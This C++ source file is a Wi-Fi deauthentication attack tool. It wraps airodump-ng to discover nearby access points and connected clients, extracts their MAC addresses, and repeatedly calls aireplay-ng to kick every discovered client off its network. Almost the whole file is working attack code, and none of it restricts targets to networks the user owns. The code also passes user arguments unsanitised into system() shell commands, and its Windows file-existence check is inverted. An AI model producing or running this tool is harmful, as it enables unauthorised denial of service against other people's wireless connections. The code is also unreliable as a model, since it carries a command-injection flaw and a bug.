#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <streambuf>
#include <algorithm>
#include <regex>

using namespace std;

vector<string> split(string str, string delimiter) {
	size_t pos = 0;
	std::string token;
	vector<string> result;
	while ((pos = str.find(delimiter)) != std::string::npos) {
		token = str.substr(0, pos);
		result.push_back(token);
		str = str.substr((size_t)pos + (size_t)delimiter.length());
	}
	result.push_back(str); //it just doesn't do the last one :(
	return result;
}



#ifdef _WIN32

inline bool exists(const std::string& name) { //thanks PherricOxide from stackoverflow, if that website didn't exist, we'd all be dead at this point because of how many bugs our programs would have
	FILE* file; 
	if (fopen_s(&file, name.c_str(), "r")) { //of course windows doesn't want to "use" fopen like linux cause its "deprecated"
		fclose(file);
		return true;
	}
	else {
		return false;
	}
}

#endif
#ifdef linux

inline bool exists(const std::string& name) { //thanks PherricOxide from stackoverflow, if that website didn't exist, we'd all be dead at this point because of how many bugs our programs would have
	if (FILE* file = fopen(name.c_str(), "r")) {
		fclose(file);
		return true;
	}
	else {
		return false;
	}
}
#endif

int main(int argc, char** argv) {

	if (argc < 3) {
		cout << "Usage of the program:\n1st Parameter: file name to store data in\n2nd Parameter: Your wifi adapter name (something like wlan0, wlo1, etc.), good luck finding it out in windows\n3rd Parameter (optional): The amount of rounds to send the attack, default 10\n4th Parameter (optional): The amount of times to send the deauth packet per round per address (default 10)";
		exit(0);
	}

	cout << "Running search command to find all targets in a network on network BSSID: ";
	cout << "\nPress CTRL + C to move on to the next step (you probably won't see this message)\n";
	string cmd = "airodump-ng --write " + string(argv[1]) + " " + string(argv[2]);
	system(cmd.c_str());


	fstream file;
	string fname;
	fname = argv[1];
	fname += "-01.csv";
	int fileNum = 1; //for the -# thingy

	while (exists(fname) == true) {
		fileNum++;
		if (fileNum < 10) {
			fname = argv[1];
			fname += "-0" + to_string(fileNum) + ".csv"; //dont even, i know casting exists but thats a lot of work
		}
		else {
			fname = argv[1];
			fname += "-" + to_string(fileNum) + ".csv";
		}
	}
	//then we subtract 1 number, cause thats what airodump-ng actually made
	fileNum--;
	if (fileNum < 10) {
		fname = argv[1];
		fname += "-0" + to_string(fileNum) + ".csv";
	}
	else {
		fname = argv[1];
		fname += "-" + to_string(fileNum) + ".csv";
	}

	file.open(fname, ios::in);
	if (!file.is_open()) {
		cout << "File not found, what did you do!?!?!?!?";
		return 0;
	}
	string filestuff((std::istreambuf_iterator<char>(file)),
		std::istreambuf_iterator<char>());

	string realData;


	if (split(filestuff, "\n\n").size() > 0) { //when aircrack-ng decides to change its format, this is screwed
		realData = split(filestuff, "\n\n")[0];
	}
	else {
		cout << "Seems like not enough data was captured... try again but wait a little longer";
		exit(0);
	}

	vector<string> entries = split(realData, "\n");
	vector<vector<string>> macAddresses;


	for (int i = 0; i < entries.size(); i++) {
		smatch m;
		regex reg("([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})"); //no one understands it, everyone uses it
		vector<string> tempAddress;
		while (regex_search(entries[i], m, reg)) {
			tempAddress.push_back(m[0]);
			entries[i] = m.suffix().str();
		}
		macAddresses.push_back(tempAddress);
	}

	cout << "\n\n\n";

	cout << "Here are all the entries that I found";

	for (int i = 0; i < macAddresses.size(); i++) {
		vector<string> currentAddress = macAddresses[i];
		if (currentAddress.size() > 1) {
			cout << currentAddress[0] + " is linked to router " + currentAddress[1] + '\n';
		}
	}

	for (int j = 0; j < (argc >= 4 ? atoi(argv[3]) : 10); j++) { 
		cout << "\nROUND " << j + 1 << "\n";
		for (int i = 0; i < macAddresses.size(); i++) {
			vector<string> currentAddress = macAddresses[i];
			if (currentAddress.size() > 1) {
				cout << "\nAttempting to kick off " << currentAddress[0] << '\n';
				string str = "aireplay-ng --deauth " + (argc >= 5 ? string(argv[4]) : "10") + " -a ";
				str.append(currentAddress[1]);
				str.append(" -c " + currentAddress[0] + " " + argv[2]);
				system(str.c_str());
			}
		}
	}

	return 0;
}